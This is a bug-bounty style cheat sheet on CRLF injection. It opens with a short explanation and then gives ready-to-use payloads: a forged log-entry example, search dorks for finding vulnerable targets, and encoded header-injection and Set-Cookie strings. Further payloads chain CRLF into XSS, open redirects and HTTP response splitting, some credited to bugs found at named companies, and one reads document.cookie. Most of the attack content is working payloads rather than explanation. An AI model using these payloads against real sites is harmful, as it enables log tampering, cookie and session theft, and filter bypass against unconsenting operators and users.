---
description: Carriage Return // Line Feed Manipulation and Exploitation into Annihilatio
---

# CRLF

The notation of carriage returns  `(\r)` and  line feeds `(\n)` goes back to the earliest CLIs, where your text wouldn't be echoed onto the screen as you were typing, though the concept can be seen in typewriters; one creates a newline and the other returns the cursor to the left side of the terminal.  They are non-visible characters much like whitespace, backspace `(\b)` and linux's `[bell] (\a)` sound,  that are also seen in regular expressions.

#### **So how do you turn a newline character into a web attack?** 

This is done by manipulating either the headers or URL in a way not expected by the web app, usually to bypass the WAF and forcefully set headers in a way that would usually be blocked; though it has been used and chain to illicit XSS, Open Redirects, HTML injection, information disclosure and command execution. 

####  **Changing Log files via URL injection**

`10.10.10.99 - 04:25 - /index.php?p=hell`  
Image a log entry looks like the above.  With an injection of newline and carriage return characters, you could inject another line below, perhaps using the server's IP address, making the action look legitimate rather than suspicious.  
`10.10.10.99 - 04:25 - /index.php?p=hell%0d%0a 127.0.0.1 - 8:19 - /index.php?p=adminlogin&deleteserver=True`

The above would be rendered as:

`10.10.10.99 - 04:25 - /index.php?p=hell  
127.0.0.1 - 8:19 - /index.php?p=adminlogin&deleteserver=True`

CRLF Injections can also insert HTTP headers which may bypass security mechanisms \(XSS, for example\) and same-origin-policy and can be used to gain sensitiive information or CSRF tokens.   
Example:`http://xyz.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e`

**Dorks to find CRLF:**  
If these are being reflected, you may be in luck!   
`site: prog.com inurl:lang= or inurl:locale=`

**Payloads List:**

```http
/%%0a0aSet-Cookie:crlf=injection
/%0aSet-Cookie:crlf=injection
/%0d%0aSet-Cookie:crlf=injection
/%0dSet-Cookie:crlf=injection
/%23%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%23%0dSet-Cookie:crlf=injection
/%25%30%61Set-Cookie:crlf=injection
/%25%30aSet-Cookie:crlf=injection
/%250aSet-Cookie:crlf=injection
/%25250aSet-Cookie:crlf=injection
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
/%2F..%0d%0aSet-Cookie:crlf=injection
/%3f%0d%0aSet-Cookie:crlf=injection
/%3f%0dSet-Cookie:crlf=injection
/%u000aSet-Cookie:crlf=injection

%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
Header-based test, site root
%0d%0aheader:header
%0aheader:header
%0dheader:header
%23%0dheader:header
%3f%0dheader:header
/%250aheader:header
/%25250aheader:header
/%%0a0aheader:header
/%3f%0dheader:header
/%23%0dheader:header
/%25%30aheader:header
/%25%30%61header:header
/%u000aheader:header
```

**CRLF chained with Open Redirect server misconfiguration**

_Note: This sometimes works. \(Discovered in some Yandex sites, was not exploitable from the root.\)_ `//www.google.com/%2f%2e%2e%0d%0aheader:header /www.google.com/%2e%2e%2f%0d%0aheader:header /google.com/%2F..%0d%0aheader:header`

**Twitter specific CRLF by @filedescriptor**

`%E5%98%8A%E5%98%8Dheader:header`

**CRLF Injection to XSS**

`%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a%0d%0a0%0d%0a/%2e%2e`

`java%0d%0ascript%0d%0a:alert(0)`   
****\(crlf injection to bypass javascript: being blacklisted\)  
  
`<iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”>`  
iFrame with javascript URI payload. Line feeds \[CRLF\] obfuscate it.

**Response splitting on 302 Redirect, before Location header \(Discovered in DoD\)** `%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E`

**Response splitting on 301 code, chained with Open Redirect to corrupt location header**   
by @black2fan \(Facebook bug\)   
_Note: xxx:1 was used for breaking open redirect destination \(Location header\). Great example how of to escalate CRLF to XSS on a such, it would seem, unexploitable 301 status code._  
  
 `%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-  
Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr`

From [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md)

